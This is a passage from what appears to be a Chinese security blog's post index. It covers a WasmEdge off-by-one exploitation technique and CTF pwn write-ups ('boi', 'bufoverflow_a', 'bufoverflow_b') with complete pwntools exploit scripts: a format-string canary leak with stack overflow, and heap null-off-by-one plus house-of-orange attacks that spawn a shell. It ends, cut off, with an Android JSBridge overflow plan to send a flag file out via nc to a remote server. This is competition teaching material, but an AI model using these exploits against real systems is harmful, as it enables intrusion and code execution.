stack中写入指令的函数地址，然后将第一个参数放入到r0寄存器，接下来会使用EmitSlotNumOfStackTopAndPop来生成第二、三个参数的插槽，深入到EmitSlotNumOfStackTopAndPop函数，可以看到如果当前栈顶顶数据位于寄存器中，那么就不会生成插槽。该设计认为第一个参数在寄存器中，那么接下来的参数不可能在寄存器中，因为r0已经被占用。实际上，他忽略了wasm3还有另一个寄存器叫fp0，用于存储浮点数据的。\n\n\n那么如果数据中有一个位于浮点寄存器中，就不能生成这个插槽，但是MemFill实现中又要使用，这就导致了插槽缺失，后果是使用pc stack中的下一个数据作为插槽。\n\n\n由于下一个数据是其它指令的实现函数地址，并不是自由可控的，因此这个漏洞无法利用，只能导致段错位。\n接下来，我要介绍WasmEdge的漏洞利用，先来看一下WasmEdge的虚拟机架构实现\n\n\nWasmEdge的实现与wasm3不一样，它的pc stack中存储的是Instruction结构体而不是实现函数的指针。它使用while-switch来对opcode进行调度。\n我们来关注一下br指令的调度函数，它调用了branchToLabel函数\n\n\n我们进入branchToLabel函数查看，关注一下参数PCOffset的值，这是在checkInstr函数中计算出的\n\n\n通过调试分析，PCOffset的值 &#x3D; target - cur，那么，当br 0时，PCOffset=1，于是给PC加上1，然后回到主while-switch时，结尾还有一个PC++，相当于br 0 直接给PC加上了2，而正常的逻辑应该是加上1，因此这相当于有一个Off By One漏洞。\n\n\n具体的PC变化过程如图\n\n\n那么，PC现在指向的是一个未知的区域。我们如果能够控制这个区域，就能够伪造Instruction结构体来完成一些操作。\n如何控制此处的内容？我们使用了i64.const指令，我们发现i64.const能够影响此处内存中的数据，同时，我们通过drop来平衡堆栈，否则过不了wasm虚拟机的前置安全检查。\n\n\n经过这一番操作过后，内存中数据如下\n\n\n可以看到内容能够被控制了，但是不是很自由的控制，后方其它内存仍然没有堆喷上。经过多次尝试也是一样。\n经过分析，发现一个方法，0x154对应了Instruction结构体中的JumpEnd，那么我们找一下谁用到了这个字段。\n\n\n发现Else指令用到了，并且它能够将PC加上JumpEnd，那么PC能够指向更后方的内存，经过调试分析，那里正好是sp stack，sp stack是完全可控的，那么我们就能够在里面自由的布局多个假的Instruction完成想要的操作。\n\n\n如图，通过v128.const来控制sp stack中的内容\n\n\n有了这个，我们就能够伪造任意指令了，伪造GlobalGet和GlobalSet完成任意地址读写\n\n\n结论\n模糊测试工具的思路来源于我在做毕业论文时看到的一篇文章《FREEDOM: Engineering a State-of-the-Art DOM Fuzzer (ACM CSS 2020)》，它讲解了如何进行上下文相关的，具有语法结构的样本生成和Fuzz方法，他的思路非常巧妙。\n在WASM的漏洞利用中，想办法控制pc stack，找漏洞时，也往这方面找，看哪些地方可能会破坏pc stack。\n使用i32.const、i64.const、v128.const等指令来布置内存中的内容。\n伪造GlobalGet和GlobalSet来完成任意地址读写。\n","categories":["安全研究"],"tags":["解释器/简易虚拟机","wasm"]},{"title":"boi","url":"/2020/02/09/boi/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n看似很复杂，我们发现这是一个服务器程序，并且一开始要发送特殊指令，才能显示出菜单\n\n\n套接字初始化，绑定了本地端口0x539也就是1337\n\n\n这里是接收指令\n\n\nUnpack是将网络字节序转为本机字节序，如x86的小端\n因此，我们一开始，为了显示出菜单，需要这样\nsh.sendline(&#x27;zhaohai&#x27;)  #发送这个，才能显示出菜单  sh.sendline(&#x27;a&#x27;*0x4 + &#x27;\\x00\\x00\\x00\\x0C\\x00\\x00\\x00\\x05&#x27;)  \n\n然后，我们看到菜单的功能6，存在栈溢出\n\n\n这里有后门函数\n\n\n那么，我们只要泄漏canary，就可以溢出了\n功能1存在一个格式化字符串漏洞，参数正式功能6里输入的v3，因此，我们可以利用格式化字符串漏洞来泄漏canary\n\n\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    getshell0 = 0x405524  sh = remote(&#x27;127.0.0.1&#x27;,&#x27;1337&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,55316)    def create():     sh.sendlineafter(&#x27;Your Choice :&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;size:&#x27;,&#x27;256&#x27;)     sh.sendlineafter(&#x27;rabbit info :&#x27;,&#x27;a&#x27;)    def show():     sh.sendlineafter(&#x27;Your Choice :&#x27;,&#x27;4&#x27;)     sh.sendlineafter(&#x27;idx:&#x27;,&#x27;0&#x27;)    sh.sendline(&#x27;zhaohai&#x27;)  #发送这个，才能显示出菜单  sh.sendline(&#x27;a&#x27;*0x4 + &#x27;\\x00\\x00\\x00\\x0C\\x00\\x00\\x00\\x05&#x27;)    #格式化字符串漏洞泄露canary  payload = &#x27;S%12$p&#x27;  sh.sendlineafter(&#x27;Your Choice :&#x27;,&#x27;6&#x27;)  sh.sendlineafter(&#x27;you can name the rabbit hole.&#x27;,payload)    create()  show()  sh.recvuntil(&#x27;S&#x27;)  canary = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)  print &#x27;canary=&#x27;,hex(canary)  payload = &#x27;a&#x27;*0x8 + p64(canary) + p64(0) + p64(getshell0)  sh.sendlineafter(&#x27;Your Choice :&#x27;,&#x27;6&#x27;)  sh.sendlineafter(&#x27;you can name the rabbit hole.&#x27;,payload)  #getshell  sh.sendlineafter(&#x27;Your Choice :&#x27;,&#x27;5&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","格式化字符串漏洞"]},{"title":"bufoverflow_a","url":"/2020/02/19/bufoverflow_a/","content":"首先，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，是一个经典的增删改查的程序，然后我们看到创建堆时，[前两个堆是用malloc创建，后面的堆用calloc创建]{.mark}，这意味着，如果要泄露libc地址，只能靠前两个堆，后面的堆从bin里取出后会清空里面的信息。\n\n\nFill功能存在一个**[null off by one漏洞]{.mark}**\n\n\n我们每次只能对最后创建的那个堆进行读写操作\n\n\n并且delete以后，指针将清空，就无法进行读写操作，除非重新创建一个堆。\n\n\n首先是泄露libc地址，这个很容易，创建一个unsorted bin范围的堆，然后**[后面再创建一个堆用来隔离]{.mark}**，释放后再申请回来显示，即可泄露。\n#0  create(0x80)  #1  create(0x80)  delete(0)  delete(1)  #0申请回来，此时保留了libc指针  create(0x80)  show()  \n\n接下来，我们要泄露堆地址，我们创建large bin范围的堆释放后申请一个比它还大的堆，使得它被放入large bin，从而堆上保留了堆指针，再申请回来。但是**[堆地址保存在fd_nextsize处，位于chunk_addr + 0x10处，我们如果直接显示，只能显示出fd的内容]{.mark}，因为后面有’x00’结束了。并且，我们也不能利用fill来填充到fd_nextsize处，因为[用fill，内容的最后会添加一个’x00’]{.mark}**\n\n\n这样，我们仍然不能显示出fd_nextsize的内容。\n#1  create(0x400) #large bin范围的堆释放后会有堆地址  create(0x80) #2  #将1放入unsorted bin  delete(1)  #触发整理unsorted bin，将1放入large bin，从而1里堆有指针  create(0x500) #1  delete(1)  \n\n目前，堆的布局是这样的\n\n\n在chunk1的数据域+0x10处，有堆指针。我们可以**[先释放chunk2，使得chunk1和2合并到top chunk]{.mark}，这样，堆布局变成了这样，但是[里面的信息仍然没有清空。]{.mark}**\n\n\n然后，我们继续释放chunk0，此时堆布局就只剩下一个TOP chunk\n\n\n接下来，[我们申请一个0xA0大小的堆(数据域大小0x90)。因为bin里面没有合适的chunk，就从TOP chunk里划分]{.mark}，堆布局变成这样\n\n\n然后，我们继续申请一个堆，大小任意，比如0x90\n此时堆布局变成这样\n\n\n由于chunk0大小为0xA0，比原先大了0x10，那么chunk1就会向后偏移0x10，也就是**[原来chunk1的fd_nextsize位置是现在chunk1的fd位置]{.mark}**，这样，我们显示，就能泄露出堆地址了。\n#释放堆2,由于堆2下面是top块，堆2上面的堆1也是free状态，那么就和全部合并到top块里，但里面的指针信息仍然有保留。  delete(2)  #此时，堆0下面的堆1是top块，释放0后，堆0也合并到了top块里。  delete(0)  #所有bin都合并了，只剩下一个top块  #错位0x10,使得接下来1的fd位置正好有堆指针  create(0x90) #0  create(0x80) #1  show()  sh.recv(1)  heap_base = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;)) - 0xB0  print &#x27;heap_base=&#x27;,hex(heap_base)  #============================================  delete(0)  delete(1)  \n\n我们泄露完信息后，又重新把0和1给释放了，使得他们重新合并到top chunk里。因为我们不需要再用它们了。[并且由于只有前两个堆使用malloc分配，后面的用calloc分配，为了后续利用，我们要腾出位置。]{.mark}\n接下来，我们就要伪造堆了。我们最终的目的是要构造出这样的堆布局\n\n\n这样，我们就能从unsorted bin1里申请合适的堆，控制unsorted bin2，从而利用house of orange来getshell。\n那么，我们就先来伪造chunk\n#0  create(0x208)  fake_chunk = &#x27;a&#x27;*0x20  fake_chunk += p64(0) + p64(0x1E1)  #让fd=bk=p绕过检查  fake_chunk += p64(heap_base + 0x50)*2  fake_chunk = fake_chunk.ljust(0x200,&#x27;a&#x27;)  fake_chunk += p64(0x1E0)  fill(fake_chunk)  #1  create(0x80)  #2注意，2必须为0xF0，这样实际为0x100，off by null one后大小仍为0x100，与top chunk相邻，才能合并到top chunk  #因此不能在2末尾伪造fake_chunk  create(0xF0)  fill(&#x27;b&#x27;*0xF0)    delete(1)  #1  create(0x88)  fill(&#x27;b&#x27;*0x80 + p64(0x270))  #合并  delete(2)  \n\n需要注意的是，以前，为了绕过glibc中的检查\nif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      malloc_printerr (&quot;corrupted double-linked list&quot;);  \n我们这样操作的\np-&gt;fd = &amp;p-3*4  p-&gt;bk = &amp;p-2*4  \n\n但是，现在我们没有办法满足这个条件，我们直接这样\np-&gt;fd = p  p-&gt;bk = p  \n\n还有就是，[我们的chunk2，包括头结构的总大小为0x100，不能再多也不能再少。]{.mark}\n因为null off by one，可以将下一个chunk的size低一字节覆盖为0，因此，size必须大于1字节。但是如果size大于0x100，这意味着，覆盖以后，这个chunk变小了，我们还需在这个chunk的末尾伪造一个填充chunk。这样会使得待会利用时,由于有填充chunk把它与top chunk隔离，使得它不与top chunk合并。[而我们的目的是要把fake_chunk合并到top chunk里，这样我们就能构造出包含的unsorted bin。]{.mark}\n经过这样的操作，我们的堆布局变成这样\n\n\n着色区域全都在top chunk里面，现在，我们就可以来构造两个包含的unsorted bin。\n我们先来构造0和1构成的unsorted bin，为了能够顺利delete掉0和1，我们需要复原1和2的头结构相关信息。\n####注意create(0x290) #2#重新复原1、2堆的头信息  fill(&#x27;a&#x27;*0x1D0 + p64(0) + p64(0x91) + &#x27;a&#x27;*0x80 + p64(0) + p64(0x101) + &#x27;\\n&#x27;)  #为了delete后我们的内容不被清空或填充，#我们需要把chunk1也给剔除，这样我们后面申请的时候，才不会被mallocopt设置free后的填充物#注意顺序！！！delete(1)  delete(0)  \n\n由于top chunk在fake_chunk处，因此，我们申请时，从top chunk里切割就是从fake_chunk处开始切割。这样，我们就得到了最外层的unsorted bin。\n\n\n然后，我们要开始构造内层的unsorted bin，那么我们需要释放fake_chunk。而fake_chunk此时位于index 2。[接下来，我们申请堆，肯定会从我们辛苦得到的外层unsorted bin里切割，没关系，待会用完重新释放回去。]{.mark}在程序中的堆指针数组中下标2的地方保存着fake_chunk的地址，[我们现在的目的是要成功释放fake_chunk2。但是，fake_chunk前后的chunk头信息已经被打乱，我们不能直接释放。]{.mark}\n我们可以从外层unsorted bin里申请一个大点的堆，然后，我们要在这个堆里重新伪造fake_chunk，已经一个填充chunk，由于绕过检查。[也就是说，我们要在原来的fake_chunk里面末尾腾出一点位置，制造一个填充chunk，就可以绕过检查了。]{.mark}\n#重新从外层的unsorted bin切割一块空间  create(0x290) #0  #在fake_chunk里腾出位置伪造填充块，而这个chunk0末尾也要放一个填充块绕过检查  #也就是总共要伪造三个chunk，总大小要等于这个chunk0的大小，即0x290  fill(&#x27;a&#x27;*0x20 + p64(0) + p64(0x91) + &#x27;a&#x27;*0x80 + p64(0) + p64(0x151) + &#x27;\\n&#x27;)  delete(0) #得到外层unsorted bin  delete(2) #得到内层unsorted bin  create(0x290)  #现在，我们已经可以控制unsorted bin了  \n\n这样，我们就控制了内层的unsorted bin。那么我们就可以利用**[house of orange]{.mark}**了。\n本题，提供的libc版本是2.24，因此增加了对vtable的检查。\nIO_validate_vtable (const struct _IO_jump_t *vtable)  &#123;    /* Fast path: The vtable pointer is within the __libc_IO_vtables      section.  */    uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;    const char *ptr = (const char *) vtable;    uintptr_t offset = ptr - __start___libc_IO_vtables;    if (__glibc_unlikely (offset &gt;= section_length))      /* The vtable pointer is not in the expected section.  Use the        slow path, which will terminate the process if necessary.  */      _IO_vtable_check ();    return vtable;  &#125;  \n\n也就是vtable指针必须在__stop___IO_vtables 和 __start___libc_IO_vtables范围之内。因此，我们可以利用__IO_str_jumps来绕过\n&#123;    JUMP_INIT_DUMMY,    JUMP_INIT(finish, _IO_str_finish),    JUMP_INIT(overflow, _IO_str_overflow),    JUMP_INIT(underflow, _IO_str_underflow),    JUMP_INIT(uflow, _IO_default_uflow),    JUMP_INIT(pbackfail, _IO_str_pbackfail),    JUMP_INIT(xsputn, _IO_default_xsputn),    JUMP_INIT(xsgetn, _IO_default_xsgetn),    JUMP_INIT(seekoff, _IO_str_seekoff),    JUMP_INIT(seekpos, _IO_default_seekpos),    JUMP_INIT(setbuf, _IO_default_setbuf),    JUMP_INIT(sync, _IO_default_sync),    JUMP_INIT(doallocate, _IO_default_doallocate),    JUMP_INIT(read, _IO_default_read),    JUMP_INIT(write, _IO_default_write),    JUMP_INIT(seek, _IO_default_seek),    JUMP_INIT(close, _IO_default_close),    JUMP_INIT(stat, _IO_default_stat),    JUMP_INIT(showmanyc, _IO_default_showmanyc),    JUMP_INIT(imbue, _IO_default_imbue)  &#125;;  \n\n我们可以利用_IO_str_finish函数里的这个\n_IO_str_finish (FILE *fp, int dummy)  &#123;    if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))      (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);    fp-&gt;_IO_buf_base = NULL;    _IO_default_finish (fp, 0);  &#125;  \n\n我们把vtable指向__IO_str_jumps，把fp-&gt;_free_buffer指向system函数，把fp-&gt;_IO_buf_base指向&#x2F;bin&#x2F;sh字符串，再伪造其他字段，绕过检查，这样就能触发调用system(“&#x2F;bin&#x2F;sh”)了。同理_IO_str_overflow类似。\n#house of orange in 2.24  fake_file = p64(0) + p64(0x60)  #unsorted bin attack，修改_IO_list_all为main_arena+88  fake_file += p64(0) + p64(_IO_list_all_addr-0x10)  #_IO_write_base &lt; _IO_write_ptr  fake_file += p64(0) + p64(1)  #_IO_write_end 、IO_buf_base  fake_file += p64(0) + p64(binsh_addr)  fake_file = fake_file.ljust(0xD8,&#x27;\\x00&#x27;)  #vtable指针,同时，也作为fake_vtable的__dummy  fake_file += p64(_IO_str_jumps_addr - 8)  #__dummy2、__finish  fake_file += p64(0) + p64(system_addr)  \n\n\n\n如果没有getshell，是由于栈环境问题，多试几次就行了。\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./bufoverflow_a&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,34863)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  #libc = ELF(&#x27;./libc.so.6&#x27;)  _IO_list_all_s = libc.symbols[&#x27;_IO_list_all&#x27;]  malloc_hook_s =  libc.symbols[&#x27;__malloc_hook&#x27;]  system_s = libc.sym[&#x27;system&#x27;]  binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()    def create(size):     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Size:&#x27;,str(size))    def delete(index):     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Index:&#x27;,str(index))    def fill(content):     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)     sh.sendafter(&#x27;Content:&#x27;,content)    def show():     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)    def get_IO_str_jumps():     IO_file_jumps_offset = libc.sym[&#x27;_IO_file_jumps&#x27;]     IO_str_underflow_offset = libc.sym[&#x27;_IO_str_underflow&#x27;]     for ref_offset in libc.search(p64(IO_str_underflow_offset)):         possible_IO_str_jumps_offset = ref_offset - 0x20         if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:            print possible_IO_str_jumps_offset            return possible_IO_str_jumps_offset  #==============泄露libc相关地址============  #0  create(0x80)  #1  create(0x80)  delete(0)  delete(1)  #0申请回来，此时保留了libc指针  create(0x80)  show()  sh.recv(1)  #泄露信息  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) +  (malloc_hook_s &amp; 0XFFF)  libc_base = malloc_hook_addr - malloc_hook_s  _IO_list_all_addr = libc_base + _IO_list_all_s  _IO_str_jumps_addr = libc_base + get_IO_str_jumps()  system_addr = libc_base + system_s  binsh_addr = libc_base + binsh_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;_IO_list_all_addr=&#x27;,hex(_IO_list_all_addr)  print &#x27;system_addr=&#x27;,hex(system_addr)  #===========泄露堆地址====================  #1  create(0x400) #large bin范围的堆释放后会有堆地址  create(0x80) #2  #将1放入unsorted bin  delete(1)  #触发整理unsorted bin，将1放入large bin，从而1里堆有指针  create(0x500) #1  delete(1)  #释放堆2,由于堆2下面是top块，堆2上面的堆1也是free状态，那么就和全部合并到top块里，但里面的指针信息仍然有保留。  delete(2)  #此时，堆0下面的堆1是top块，释放0后，堆0也合并到了top块里。  delete(0)  #所有bin都合并了，只剩下一个top块  #错位0x10,使得接下来1的fd位置正好有堆指针  create(0x90) #0  create(0x80) #1  show()  sh.recv(1)  heap_base = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;)) - 0xB0  print &#x27;heap_base=&#x27;,hex(heap_base)  #============================================  delete(0)  delete(1)  #0  create(0x208)  fake_chunk = &#x27;a&#x27;*0x20  fake_chunk += p64(0) + p64(0x1E1)  #让fd=bk=p绕过检查  fake_chunk += p64(heap_base + 0x50)*2  fake_chunk = fake_chunk.ljust(0x200,&#x27;a&#x27;)  fake_chunk += p64(0x1E0)  fill(fake_chunk)  #1  create(0x80)  #2注意，2必须为0xF0，这样实际为0x100，off by null one后大小仍为0x100，与top chunk相邻，才能合并到top chunk  #因此不能在2末尾伪造fake_chunk  create(0xF0)  fill(&#x27;b&#x27;*0xF0)    delete(1)  #1  create(0x88)  fill(&#x27;b&#x27;*0x80 + p64(0x270))  #合并  delete(2)  ####注意  create(0x290) #2  #重新复原1、2堆的头信息  fill(&#x27;a&#x27;*0x1D0 + p64(0) + p64(0x91) + &#x27;a&#x27;*0x80 + p64(0) + p64(0x101) + &#x27;\\n&#x27;)  #为了delete后我们的内容不被清空或填充，  #我们需要把chunk1也给剔除，这样我们后面申请的时候，才不会被mallocopt设置free后的填充物  #注意顺序！！！  delete(1)  delete(0)    #重新从外层的unsorted bin切割一块空间  create(0x290) #0  #在fake_chunk里腾出位置伪造填充块，而这个chunk0末尾也要放一个填充块绕过检查  #也就是总共要伪造三个chunk，总大小要等于这个chunk0的大小，即0x290  fill(&#x27;a&#x27;*0x20 + p64(0) + p64(0x91) + &#x27;a&#x27;*0x80 + p64(0) + p64(0x151) + &#x27;\\n&#x27;)  delete(0) #得到外层unsorted bin  delete(2) #得到内层unsorted bin  create(0x290)  #现在，我们已经可以控制unsorted bin了  payload = &#x27;a&#x27;*0x20  #house of orange in 2.24  fake_file = p64(0) + p64(0x60)  #unsorted bin attack，修改_IO_list_all为main_arena+88  fake_file += p64(0) + p64(_IO_list_all_addr-0x10)  #_IO_write_base &lt; _IO_write_ptr  fake_file += p64(0) + p64(1)  #_IO_write_end 、IO_buf_base  fake_file += p64(0) + p64(binsh_addr)  fake_file = fake_file.ljust(0xD8,&#x27;\\x00&#x27;)  #vtable指针,同时，也作为fake_vtable的__dummy  fake_file += p64(_IO_str_jumps_addr - 8)  #__dummy2、__finish  fake_file += p64(0) + p64(system_addr)  payload += fake_file  payload += &#x27;\\n&#x27;  fill(payload)  #getshell  create(0x80)    sh.interactive()  ","categories":["CTF"],"tags":["unsorted bin","house of orange","off by one","IO FILE"]},{"title":"bufoverflow_b","url":"/2020/02/19/bufoverflow_b/","content":"这题和bufferoverflow_a类似，只是在输入的时候，增加了一个检查\n\n\n[遇到空字符就会截断，这将不利于我们在chunk里伪造数据。]{.mark}\n另外增加了一个功能，不过我没有使用到。\n\n\n遇到’x00’就会截断，但是**[我们仍然可以完整的把我们的伪造数据放进去。]{.mark}**\n比如，我们要在偏移0x30处写一个数据0x0000000000123456，我们先把0x30处的8字节数据清零，我们可以这样，第一次payload &#x3D; ‘a’*0x37 + ‘x00’，第二次payload &#x3D; ‘a’*0x36 + ‘x00’，第三次payload &#x3D; ‘a’0x35 + ‘x00’这样循环8次，即可以把0x30处的8字节数据清零。然后，我们就可以写数据了。payload &#x3D; ‘a’0x30 + ‘x56x34x12x00’。**[需要注意的时，我们需要照着原来buffoverflow_a的payload，倒过来从最后一个数据开始部署。这样，我们才能不把已经部署的给覆盖掉。]{.mark}\n直接上exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./bufoverflow_b&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,49457)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  #libc = ELF(&#x27;./libc.so.6&#x27;)  _IO_list_all_s = libc.symbols[&#x27;_IO_list_all&#x27;]  malloc_hook_s =  libc.symbols[&#x27;__malloc_hook&#x27;]  system_s = libc.sym[&#x27;system&#x27;]  binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()    def create(size):     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Size:&#x27;,str(size))    def delete(index):     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Index:&#x27;,str(index))    def fill(content):     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)     sh.sendafter(&#x27;Content:&#x27;,content)    def show():     sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)  #清零offset处开始8字节的空间  def clean(offset):     for i in range(7,-1,-1):        fill(&#x27;b&#x27;*(offset + i) + &#x27;\\x00&#x27;)    def get_IO_str_jumps():     IO_file_jumps_offset = libc.sym[&#x27;_IO_file_jumps&#x27;]     IO_str_underflow_offset = libc.sym[&#x27;_IO_str_underflow&#x27;]     for ref_offset in libc.search(p64(IO_str_underflow_offset)):         possible_IO_str_jumps_offset = ref_offset - 0x20         if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:            print possible_IO_str_jumps_offset            return possible_IO_str_jumps_offset  #==============泄露libc相关地址============  #0  create(0x80)  #1  create(0x80)  delete(0)  delete(1)  #0申请回来，此时保留了libc指针  create(0x80)  show()  sh.recv(1)  #泄露信息  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) +  (malloc_hook_s &amp; 0XFFF)  libc_base = malloc_hook_addr - malloc_hook_s  _IO_list_all_addr = libc_base + _IO_list_all_s  _IO_str_jumps_addr = libc_base + get_IO_str_jumps()  system_addr = libc_base + system_s  binsh_addr = libc_base + binsh_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;_IO_list_all_addr=&#x27;,hex(_IO_list_all_addr)  print &#x27;system_addr=&#x27;,hex(system_addr)  #===========泄露堆地址====================  #1  create(0x400) #large bin范围的堆释放后会有堆地址  create(0x80) #2  #将1放入unsorted bin  delete(1)  #触发整理unsorted bin，将1放入large bin，从而1里堆有指针  create(0x500) #1  delete(1)  #释放堆2,由于堆2下面是top块，堆2上面的堆1也是free状态，那么就和全部合并到top块里，但里面的指针信息仍然有保留。  delete(2)  #此时，堆0下面的堆1是top块，释放0后，堆0也合并到了top块里  delete(0)  #所有bin都合并了，只剩下一个top块  #错位0x10,使得接下来1的fd位置正好有堆指针  create(0x90) #0  create(0x80) #1  show()  sh.recv(1)  heap_base = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;)) - 0xB0  print &#x27;heap_base=&#x27;,hex(heap_base)  #============================================  delete(0)  delete(1)  #0  create(0x208)  &#x27;&#x27;&#x27;&#x27;&#x27;fake_chunk = &#x27;a&#x27;*0x20 fake_chunk += p64(0) + p64(0x1E1) #让fd=bk=p绕过检查 fake_chunk += p64(heap_base + 0x50)*2 fake_chunk = fake_chunk.ljust(0x200,&#x27;a&#x27;) fake_chunk += p64(0x1E0)&#x27;&#x27;&#x27;  #由于限制，我们倒着部署fake_chunk  clean(0x200)  fake_chunk = &#x27;a&#x27;*0x200 + &#x27;\\xE0\\x01\\x00&#x27;  fill(fake_chunk)  clean(0x38)  fake_chunk = &#x27;a&#x27;*0x38 + p64(heap_base + 0x50)[0:7]  fill(fake_chunk)  clean(0x30)  fake_chunk = &#x27;a&#x27;*0x30 + p64(heap_base + 0x50)[0:7]  fill(fake_chunk)  clean(0x28)  fake_chunk = &#x27;a&#x27;*0x28 + &#x27;\\xE0\\x01\\x00&#x27;  fill(fake_chunk)  #1  create(0x80)  #2注意，2必须为0xF0，这样实际为0x100，off by null one后大小仍为0x100，与top chunk相邻，才能合并到top chunk  #因此不能在2末尾伪造fake_chunk  create(0xF0)  fill(&#x27;b&#x27;*0xF0)    delete(1)  #1  create(0x88)  #fill(&#x27;b&#x27;*0x80 + p64(0x270))  fill(&#x27;b&#x27;*0x88) #off by one  clean(0x80)  fill(&#x27;b&#x27;*0x80 + &#x27;\\x70\\x02\\x00&#x27;)  #合并  delete(2)  ####注意  create(0x290)  #重新复原1、2堆的头信息  #fill(&#x27;a&#x27;*0x1D0 + p64(0) + p64(0x91) + &#x27;a&#x27;*0x80 + p64(0) + p64(0x101) + &#x27;\\n&#x27;)  clean(0x268)  fill(&#x27;a&#x27;*0x268 + &#x27;\\x01\\x01\\x00&#x27;)  clean(0x1D8)  fill(&#x27;a&#x27;*0x1D8 + &#x27;\\x91\\x00&#x27;)  #为了delete后我们的内容不被清空或填充，  #我们需要把chunk1也给剔除，这样我们后面申请的时候，才不会被mallocopt设置free后的填充物  #注意顺序！！！  delete(1)  delete(0)    create(0x290) #0  #在fake_chunk里腾出位置伪造填充块，而这个chunk0末尾也要放一个填充块绕过检查  #也就是总共要伪造三个chunk，总大小要等于这个chunk0的大小，即0x290  #fill(&#x27;a&#x27;*0x20 + p64(0) + p64(0x91) + &#x27;a&#x27;*0x80 + p64(0) + p64(0x151) + &#x27;\\n&#x27;)  clean(0xB8)  fill(&#x27;a&#x27;*0xB8 + &#x27;\\x51\\x01\\x00&#x27;)  clean(0x28)  fill(&#x27;a&#x27;*0x28 + &#x27;\\x91\\x00&#x27;)  delete(0) #得到外层unsorted bin  delete(2) #得到内层unsorted bin  create(0x290)    #现在，我们已经可以控制unsorted bin了  payload = &#x27;a&#x27;*0x20  #house of orange in 2.24  &#x27;&#x27;&#x27;&#x27;&#x27;fake_file = p64(0) + p64(0x60) #unsorted bin attack，修改_IO_list_all为main_arena+88 fake_file += p64(0) + p64(_IO_list_all_addr-0x10) #_IO_write_base &lt; _IO_write_ptr fake_file += p64(0) + p64(1) #_IO_write_end 、IO_buf_base fake_file += p64(0) + p64(binsh_addr) fake_file = fake_file.ljust(0xD8,&#x27;\\x00&#x27;) #vtable指针,同时，也作为fake_vtable的__dummy fake_file += p64(_IO_str_jumps_addr - 8) #__dummy2、__finish fake_file += p64(0) + p64(system_addr)&#x27;&#x27;&#x27;    start = 0x20  clean(start + 0xE8)  fill(payload + &#x27;a&#x27;*0xE8 + p64(system_addr)[0:7])  clean(start + 0xE0)  clean(start + 0xD8)  fill(payload + &#x27;a&#x27;*0xD8 + p64(_IO_str_jumps_addr - 8)[0:7])  for i in range(0xD0,0x38,-8):     #print hex(i)     clean(start + i)  clean(start + 0x38)  fill(payload + &#x27;a&#x27;*0x38 + p64(binsh_addr)[0:7])  clean(start + 0x30)  clean(start + 0x28)  fill(payload + &#x27;a&#x27;*0x28 + &#x27;\\x01\\x00&#x27;)  clean(start + 0x20)  clean(start + 0x18)  fill(payload + &#x27;a&#x27;*0x18 + p64(_IO_list_all_addr-0x10)[0:7])  clean(start + 0x10)  clean(start + 0x8)  fill(payload + &#x27;a&#x27;*0x8 + p64(0x60)[0:2])  clean(start + 0)  #raw_input()  create(0x80)    sh.interactive()  ","categories":["CTF"],"tags":["unsorted bin","house of orange","off by one","IO FILE","从后往前布置数据"]},{"title":"bytectf2020 pwnandroid","url":"/2020/10/27/bytectf2020-pwnandroid/","content":"一个安卓端程序，native层是简单的菜单程序，其中edit功能没有检查长度，可以溢出，并且没有使用\\0截断字符串，在show的时候可以泄露后续的数据\n\n难点在于如何进行交互，程序注册了JSBridge用于与js进行交互，其中该接口对象在js中的对象名为_jsbridge\n\n该对象有一个call函数\n\n因此，在javascript里，可以使用javascript:_jsbridge.call设置好参数后就能调用到对应的函数。\n溢出漏洞利用，覆盖函数指针为system，执行nc命令将flag文件反弹到远程服务器里。\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        var xhr 